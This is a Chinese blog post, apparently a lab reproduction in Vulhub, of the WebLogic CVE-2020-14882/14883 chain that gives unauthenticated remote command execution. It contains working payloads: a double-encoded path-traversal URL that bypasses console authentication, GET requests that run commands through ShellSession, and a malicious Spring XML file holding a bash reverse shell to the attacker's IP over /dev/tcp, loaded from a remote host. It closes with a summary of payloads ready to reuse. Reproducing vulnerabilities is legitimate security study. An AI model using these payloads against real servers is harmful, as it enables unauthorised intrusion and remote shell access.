# Weblogic 未授权远程命令执行漏洞（CVE-2020-14882&CVE-2020-14883）复现 - 小菜鸟当黑客 - 博客园

> 原文：[`www.cnblogs.com/bflw/p/14313865.html`](https://www.cnblogs.com/bflw/p/14313865.html)

### 0x01 漏洞简介

Weblogic 是 Oracle 公司推出的 J2EE 应用服务器，CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。

### 0x02 环境搭建

本次实验用到三个虚拟机

攻击机：Kali       ip：192.168.222.131

环境机：Ubantu     ip：192.168.222.128

Xml 挂载：windows 7  ip：192.168.222.130（这个好像网上也有自己用起一个也行）

　　Ubantu  Vulhub

Docker 启动

![](img/16c687132faa3a154d5b249ca8feff59.png)

### 0x03 影响版本

10.3.6.0.0,

12.1.3.0.0,

12.2.1.3.0,

12.2.1.4.0,

14.1.1.0.0

### 0x04 漏洞复现

访问：

```
http://192.168.222.128:7001/console/css/%252e%252e%252fconsole.portal
```

 ![](img/bcab42740b6da4edb9614b7e9eb18251.png)

未授权复现完成。

远程命令执行：

```
http://192.168.99.100:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

```
touch /tmp/success1    //替换其他命令

```

反弹 shell

 这个利用方法只能在 Weblogic 12.2.1 以上版本利用，因为 10 版本并不存在 com.tangosol.coherence.mvel2.sh.ShellSession 类，使用 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 类时，需要构造一个恶意的 xml 文件。

rec.xml

```
<beans   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
<constructor-arg>
<list>
<value>-c</value>
<value>/bin/bash</value>
<value><![CDATA[bash -i >& /dev/tcp/192.168.222.131/8888 0>&1]]></value>
</list>
</constructor-arg>
</bean>
</beans>
```

Poc：

```
http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.222.130/rce.xml")
```

Rce.xml 文件下载：[`192.168.222.130/rce.xml`](http://192.168.222.130/rce.xml)  （windows 7 自己起的）

如果用到弹 shell 需要自己替换一下 xml 弹 shell 命令

访问抓包

![](img/fbe045041da74229c42c04606160458c.png)

然后用 kali  nc 监听 8888

![](img/9b1620d3c634eec9262127d8c9f0921d.png)

在将获取的数据包 repeater 重放

![](img/37eb7b5ddfcc7ea5b3e69d0f8b495ac9.png)

Poc 整理：

反弹 shell ：

```
http://ip+端口/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://*.*.*.*/evil.xml")
```

需要 xxx.xml 文件。修改文件内的命令

未授权：

```
http://192.168.99.100:7001/console/css/%252e%252e%252fconsole.portal
```

命令执行：

```
http://192.168.99.100:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

这里执行的

touch%20/tmp/success1

文章参考：https://www.cnblogs.com/2rsh0u/p/13911794.html